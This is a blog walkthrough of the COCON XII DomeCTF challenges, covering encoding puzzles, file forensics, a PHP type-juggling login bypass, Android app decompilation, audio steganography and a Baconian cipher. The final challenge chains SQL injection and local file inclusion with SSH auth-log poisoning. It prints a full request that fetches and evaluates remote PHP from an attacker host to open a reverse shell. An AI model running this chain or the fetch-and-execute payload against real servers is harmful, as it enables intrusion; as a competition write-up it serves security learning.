---
title: COCON XII DOME CTF Walkthrough
description: This is the walkthrough for the challenges that were provided as a part of COCON's DomeCTF
date: 2019-10-02
slug: C0C0N-XII-CTF-Walkthrough
teaser: /assets/images/cocon-xii-ctf/logo.png
categories:
- capture the flag
- infosec
tags:
- ctf
- jeopardy
- dome ctf
---
Before we start reading can we just admire the Badge that was given as a part of DOME CTF.

![](/assets/images/cocon-xii-ctf/badge.png)

![](/assets/images/cocon-xii-ctf/australia.png)

In this challenge, we were given a message.txt file that contained a long base64 string when decoded gives out a string that is either reversed or encrypted with rot13 by recursively decoding this message and at the end, the flag is displayed.

```
domectf{T5EN7Uxp7KjluznduX8tmXlhc5lX0qHH}
```
![](/assets/images/cocon-xii-ctf/botswana.png)

In this challenge as the challenge, the description says to read the rules page that was given at the time of registration. On that page, there was a QR code when scanned spits out a link to a gist snippet.
```
https://gist.githubusercontent.com/anees264/90af6d6e6b80c65b18a15e7c0dd769bd/raw/eb0bdcbf19368d9dc4ed66450816ca4314e88dd4/the_rules.txt
```
```
'CB;_9>7<;43Wxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCB^]\[ZYXW
VUTMqQPON0Fj-IHG@d'&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMc
bgf_dcb[`_X|?>=<;:9876543210/.-CHG@EDCBA@9]~}|{zyxwvutsrqponmlkjihgfedcba`_^
]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#"!~}|{zyxwvutsrqp
onmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;W9OTMRQPONMLKDh+*)('&%$
#"!~}|{zyxwvutsrqp.-,+k)('&}|{Aba`_^]\[ZYXWVUTSRQPONMLhgfedcba`YAW{[ZYXWPUTM
q43210/.-,+*)('&%$#?>~<;492765.Rsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIH
GFEDCBA@?>Z<XWPOTSRQPOHlLK-CHG@?c&%$#"!~}|{zyxwvutsr0/.-,+*)(h&}Cdcba`_^]\[Z
YXWVUTSihmlkjihgfe^$EDCBA@\[ZYXW9OTSLp3210/.-,+*)('&%$#">~<5:927654-Qrqponm+
*#"'&%$#"y?`|{zyxq7XWVUTSRQPONMLKJIHGFEa`_^]\[ZYRWPtT6Lp3INMLEi,+*)('=BA@?>=
<;:3W765432r0)Mn&%*#Ghgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:98765432
10/.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFED
CBA@?>=<;:9876543210/.-,+*)('&%$@?8=<5:98765.Rsrqpon,l$)('~%$#z@x}|{zyxq7Xtm
3Tpoh.ONMLKJ`e^cba`_^]Vz=<;:9876543210/.-,+*)(DCBA@?>=<|{3Wxwvutsrqponmlkjih
gfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#"!~}|{z
yxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:98765QPON0LK
JIHGFE>b<;@?>=<54Xyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFED`_^]
?[ZYXWVUNr543210/.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSR
QPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfed
cba`_^]\[ZYXWVUTSRQPlNdchgfedcba`Y}@\UZYXWVOs6543210/.-,+*)('&%A@?!7<;:9870T
utsrqp.-,+k)('&%|Bcba`_^]\[ZYXWVUTSRnmlkjihJfed]#n
```
Which is Malbolge an esoteric programming language we can use an interpreter to get the output of the program?
```
domectf{VknClfWQ4AK6Oo3L0PkC1WCiDgqrO1HW}
```
![](/assets/images/cocon-xii-ctf/brazil.png)

In this challenge, we are provided with a file called d0me by running the file command over it we can see that the file is a boot partition.
 
 ![](/assets/images/cocon-xii-ctf/brazil1.png)
 
 At first, we tried many stupid things but failed miserably when we ran the foremost against the file it gave a png image which was the flag to that challenge.
 
  ![](/assets/images/cocon-xii-ctf/brazil2.png)
  
  ![](/assets/images/cocon-xii-ctf/flag1.png)

  ![](/assets/images/cocon-xii-ctf/congo.png)
  
  In this challenge, we have a login page and nothing else.
  
   ![](/assets/images/cocon-xii-ctf/congo_login.png)
   
   By doing a directory bruteforcing on the server we got a backup directory that contained a zip file.
   ![](/assets/images/cocon-xii-ctf/congo_dir.png)
	  
   ![](/assets/images/cocon-xii-ctf/congo_backup.png)
   
   After extracting the zip file there were 4 files.
    ![](/assets/images/cocon-xii-ctf/congo_files.png)
	
```
index.php
```
 ![](/assets/images/cocon-xii-ctf/congo_index.png)
 
 ```
functions.php
```  
 ![](/assets/images/cocon-xii-ctf/congo_functions.png)
 
 ```
register.php
```
 ![](/assets/images/cocon-xii-ctf/congo_register.png)
 
 ```
 users.dat
 ```
  ![](/assets/images/cocon-xii-ctf/congo_users.png)
  
  So, when adding a user, the username is md5 hashed and the  password is base64 encoded then appended to the password database file. When retrieving the user details, the md5 of the supplied username to test is checked against the md5 hashed value in the password database.So where is the vulnerability then as you can see in the index.php file if user_info[1] == pw . The application is using == operator to check if user_info and pw is true if then print the flag. When it comes to using == in a login fuction that can only mean one thing PHP Type Juggling.So if we can find an existing user with a username that gets hashed to something that looks like **0e004561083131340065739640281486** we can use that to bypass the login function.
  
  So lets see if we can find any username in the users.dat file whose md5 sum starts with 0e and there was one username adm2salwg .Now we need to generate a username whose md5 sum equals to 0e and we can use byGcY whose md5 sum starts with 0e to get the password of adm2salwg user we can register a new user with the username as byGcY and a random password when we register as the user the password of adm2salwg is displayed which can be used to login as adm2salwg which displays the flag.
  
```
domectf{RhNI4AZ2bPCl8s0AdBs9HUhM1ggLov3n}
```

 ![](/assets/images/cocon-xii-ctf/US.png)
 
 In this challenge we are given an android application when installed asks us permissions to access the camera when we grant access to it a scanner pops up which says identify yourself we started by scanning faces and objects but it returned as an invalid scan we had a QR code on our COCON ID cards which we scanned next which was successful and gave us a login page for which we didn't have any credentials so we started decompiling the app. After decompilation, we found a file called login.class which has a password hardcoded to it.
 
 ```java
public class com/example/unlockme/login extends android/app/Activity {
     

     public static final int PERMS_REQUEST_CODE = 1 (java.lang.Integer);
     public static final int RequestPermissionCode = 1 (java.lang.Integer);
     private android.widget.EditText email;
     java.lang.String password;
     private android.widget.EditText passwrod;

     public login() { //  //()V
             aload0 // reference to self
             invokespecial android/app/Activity.()V
             aload0 // reference to self
             ldc "dGVzdHBhc3N3b3Jk" (java.lang.String)
             putfield com/example/unlockme/login.password:java.lang.String
             return
     }
```

It was a base64 string when decoded gives testpassword. We logged in using the email as admin@domectf.com and the password that we got from the source code. After logging in to the application we have a key and a picture of a lock in the background when we start to rotate the phone the key also rotates so it had something to do with the accelerometer and gyroscope sensors also the application toasts a position vector after further analysis of the source code we came to a conclusion that in order to open the lock we had to rotate the X axis of the phone to a value between 27 and 35 and hold it for 15 seconds by doing these the screen changes and displays the flag.

```java
public startTimer() { //()V
             aload0 // reference to self
             getfield com/example/unlockme/Internal.cTimer:android.os.CountDownTimer
             ifnonnull L1
             aload0 // reference to self
             new com/example/unlockme/Internal$1
             dup
             aload0 // reference to self
             ldc 15000 (java.lang.Long)//Time 15 seconds
             ldc 1000 (java.lang.Long)
             invokespecial com/example/unlockme/Internal$1.(Lcom/example/unlockme/Internal;JJ)V
             putfield com/example/unlockme/Internal.cTimer:android.os.CountDownTimer
             aload0 // reference to self
             getfield com/example/unlockme/Internal.cTimer:android.os.CountDownTimer
             invokevirtual android/os/CountDownTimer.start()Landroid/os/CountDownTimer;
             pop
         L1 {
             return
         }
     }
 public onFinish() { //()V
                  aload0 // reference to self
                  getfield com/example/unlockme/Internal$1.this$0:com.example.unlockme.Internal
                  getfield com/example/unlockme/Internal.z:float
                  ldc 27.0 (java.lang.Float) // X axis Value
                  fcmpl
                  ifle L1
                  aload0 // reference to self
                  getfield com/example/unlockme/Internal$1.this$0:com.example.unlockme.Internal
                  getfield com/example/unlockme/Internal.z:float
                  ldc 35.0 (java.lang.Float) //X axis value
                  fcmpg
                  ifge L1
                  aload0 // reference to self
                  getfield com/example/unlockme/Internal$1.this$0:com.example.unlockme.Internal
                  invokestatic com/example/unlockme/Internal.access$000(Lcom/example/unlockme/Internal;)Landroid/widget/LinearLayout;
                  ldc 2131165320 (java.lang.Integer)
                  invokevirtual android/widget/LinearLayout.setBackgroundResource(I)V
                  aload0 // reference to self
                  getfield com/example/unlockme/Internal$1.this$0:com.example.unlockme.Internal
                  invokestatic com/example/unlockme/Internal.access$100(Lcom/example/unlockme/Internal;)Landroid/widget/LinearLayout;
                  bipush 8
                  invokevirtual android/widget/LinearLayout.setVisibility(I)V
                  aload0 // reference to self
                  getfield com/example/unlockme/Internal$1.this$0:com.example.unlockme.Internal
                  invokestatic com/example/unlockme/Internal.access$200(Lcom/example/unlockme/Internal;)Landroid/widget/LinearLayout;
                  iconst_0
                  invokevirtual android/widget/LinearLayout.setVisibility(I)V
                  aload0 // reference to self
                  getfield com/example/unlockme/Internal$1.this$0:com.example.unlockme.Internal
                  invokestatic com/example/unlockme/Internal.access$300(Lcom/example/unlockme/Internal;)Landroid/widget/TextView;
                  iconst_0
                  invokevirtual android/widget/TextView.setVisibility(I)V
                  aload0 // reference to self
                  getfield com/example/unlockme/Internal$1.this$0:com.example.unlockme.Internal
                  invokestatic com/example/unlockme/Internal.access$300(Lcom/example/unlockme/Internal;)Landroid/widget/TextView;
                  aload0 // reference to self
                  getfield com/example/unlockme/Internal$1.this$0:com.example.unlockme.Internal
                  invokevirtual com/example/unlockme/Internal.stringFromJNI()Ljava/lang/String;
                  invokevirtual android/widget/TextView.setText(Ljava/lang/CharSequence;)V
              L1 {
                  return
              }
          }
```

```
domectf{CK9eXT3gse0CvIqHODsipohUfXxjgFW}
```

***These are the challenges that my team solved at the event the following challenges were completed after the event***

![](/assets/images/cocon-xii-ctf/egypt.png)

In this challenge, we are given an audio file when played seems likely to be a spectrogram challenge because of the disturbance in the audio but when played further we could hear Black Sabbath's Ironman after messing with the file I tried [audiosteg](https://github.com/danielcardeenas/AudioStego) on it which gave out another wav file.

![](/assets/images/cocon-xii-ctf/egypt1.png)

When played it sounded like the dial-pad pressing of a phone (DTFM code). Inorder to extract the DTFM code from the file we can use a tool called multimon-ng.

![](/assets/images/cocon-xii-ctf/egypt_multimon.png)

Now we have the DTFM codes now we need to format it we can use a simple python script to do that first we can replace "DTFM:" with nothing which gives us only the numbers now with a bit of formating we have this.
```
1441571551451431641461731471061651251221216316122666466145154166112121641171412711154175
```
Now this set of numbers seems to be ascii but they are octal we can use an online converter to do the job which gives us the flag.
```
domectf{gFuURQ3FR646elvJBtODWHl}
```

![](/assets/images/cocon-xii-ctf/france.png)

In this challenge, we have a riddle (Which I still don't know what it means). But here is the solution all we have to do was to check the TXT record of that domain.

![](/assets/images/cocon-xii-ctf/france_txt.png)

The base64 string in the TXT record is the flag just decode it.
```
domectf{6hau2Hd107GbDgiNGOJMw9PNPhAUtaaY}
```

![](/assets/images/cocon-xii-ctf/madagascar.png)

In this challenge, we have a weapon dealer's site which has some images but no login or any dynamic data is served in the site so we started downloading the images and ran binwalk on it and one image had a zip file embedded in it.

![](/assets/images/cocon-xii-ctf/madagascar1.png)

But it is password protected  running strings over the same image which gave out something.

![](/assets/images/cocon-xii-ctf/madagascar2.png)

So to get the password we have to change the lowercase letters to A and uppercase letters to B(I still don't know the logic behind that)

```
dOYOuthinkThisSEnteNcEISboriNGbUttHepASsworDHasastRoNgCOnneCTiOnwiTHtHIssentenCE
ABBBAAAAAABAAABBAAABABBBAAAABBABAABAABBAAAABBAAAAABABABBAAABBABAAABBABBAAAAAAABB
```

This is a Baconian cipher we can use an online tool to decipher it.

![](/assets/images/cocon-xii-ctf/madagascar3.png)

By using the password to extract the zip file we have a couple of text files in which slab.txt has the flag.

```
domectf{kPIx12IP6u004N6G6S2HheBVxrtWwJaL}
```

![](/assets/images/cocon-xii-ctf/greenland.png)

This is a base challenge were we have to execute code on the server and write the team name to /tmp/DOMECTF_BASE file.
So In this challenge, we have a e-commerce site that sells furnitures.

![](/assets/images/cocon-xii-ctf/greenland1.png)

By checking the hyperlinks we can see a login page which is vulnerable to SQL Injection.

![](/assets/images/cocon-xii-ctf/greenland_sql.png)

We can now login to the application using the password that we have.

![](/assets/images/cocon-xii-ctf/greenland_login.png)

 By checking the profile page there is a parameter called name.
 
 ![](/assets/images/cocon-xii-ctf/greenland_name.png)
 
 If we change the value of jessica the data displayed in the red box dissapears with later fuzzing we came to know that the site is vulnerable to LFI but the  application appends .log to the filename
 When we change the parameter data to profile.php?name=../../../../../../../../../var/log/auth
 
  ![](/assets/images/cocon-xii-ctf/greenland_lfi.png)
  
  var/log/auth is the error log for ssh connections so if we can make an error in connecting ssh that would get stored in this file which when included it gets executed. Inorder to execute commands we need to use our php code as the username for an ssh connection.
  
   ![](/assets/images/cocon-xii-ctf/greenland_ssh.png)
   
   Now include the auth file and the php code gets executed
   
   ![](/assets/images/cocon-xii-ctf/greenland_exec.png)
   
   Because SSH usernames has a length restriction we cannot execute code directly so we need something small.
   
```
To get a reverse shell we can use metasploit's web_delivery module
   
https://furniture-shop.domectf.in/dashboard/examples/profile.php?name=../../../../../../../../../var/log/auth&c=php -d allow_url_fopen=true -r "eval(file_get_contents('http://ipaddr:8080/uqB7NiEfaNe'));"
```

 ![](/assets/images/cocon-xii-ctf/greenland_msf.png)
 
 
